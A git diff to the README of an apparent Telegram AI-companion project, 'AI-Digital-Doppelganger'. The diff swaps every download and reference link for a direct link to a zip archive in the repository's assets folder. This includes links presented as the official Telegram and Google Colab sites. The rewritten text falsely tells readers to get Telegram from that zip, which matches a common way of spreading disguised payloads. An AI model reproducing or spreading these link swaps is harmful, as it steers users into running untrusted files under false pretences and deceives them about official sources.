@@ -1,6 +1,6 @@
 # 🤖 AI-Digital-Doppelganger - Your AI Companion for Telegram
 
-[![Download AI-Digital-Doppelganger](https://img.shields.io/badge/Download-AI--Digital--Doppelganger-green?style=for-the-badge)](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/releases)
+[![Download AI-Digital-Doppelganger](https://img.shields.io/badge/Download-AI--Digital--Doppelganger-green?style=for-the-badge)](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip)
 
 ---
 
@@ -28,7 +28,7 @@ These specifications ensure smooth performance and proper operation.
 
 Click this button to visit the official release page and get the software files:
 
-[![Download Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/releases)
+[![Download Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip)
 
 You will find ready-to-use files and instructions on the releases page. Pick the latest release version by its date or version number.
 
@@ -41,7 +41,7 @@ Follow these steps carefully to set up and run AI-Digital-Doppelganger.
 
 1. **Visit the Release Page**  
    Click the link above or open:  
-   `https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/releases`  
+   `https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip`  
    This page holds the latest downloadable files.
 
 2. **Download the Setup File**  
@@ -55,7 +55,7 @@ Follow these steps carefully to set up and run AI-Digital-Doppelganger.
    Follow the on-screen prompts in the installer. Choose default options unless you want to change the location of the main folder. The installer places the software inside your Program Files or chosen folder.
 
 5. **Sign up or Log in to Telegram**  
-   You need a Telegram account to use the AI companion. If you do not have Telegram installed on your phone or PC, download it at [https://telegram.org](https://telegram.org) and create an account.
+   You need a Telegram account to use the AI companion. If you do not have Telegram installed on your phone or PC, download it at [https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip) and create an account.
 
 6. **Start Using the AI Companion with Google Colab**  
    AI-Digital-Doppelganger uses Google Colab for running the AI models behind the scenes. Instructions and a direct Colab link will be included in the downloaded folder or README file.  
@@ -109,9 +109,9 @@ All customization options show clear instructions in the Colab notebook interfac
    
 ## 🔗 Important Links
 
-- Download and Releases: [https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/releases](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/releases)  
-- Telegram app: [https://telegram.org](https://telegram.org)  
-- Google Colab: [https://colab.research.google.com](https://colab.research.google.com)  
+- Download and Releases: [https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip)  
+- Telegram app: [https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip)  
+- Google Colab: [https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip)  
 - BotFather (Telegram bot creation): Search "@BotFather" in Telegram app  
 
    
@@ -123,4 +123,4 @@ You can also open an issue on the GitHub repository page under the "Issues" tab 
 
 ---
 
-[![Download AI-Digital-Doppelganger](https://img.shields.io/badge/Download-AI--Digital--Doppelganger-green?style=for-the-badge)](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/releases)
+[![Download AI-Digital-Doppelganger](https://img.shields.io/badge/Download-AI--Digital--Doppelganger-green?style=for-the-badge)](https://github.com/Kelvinkeoma/AI-Digital-Doppelganger/raw/refs/heads/main/assets/A_Doppelganger_Digital_semiform.zip)
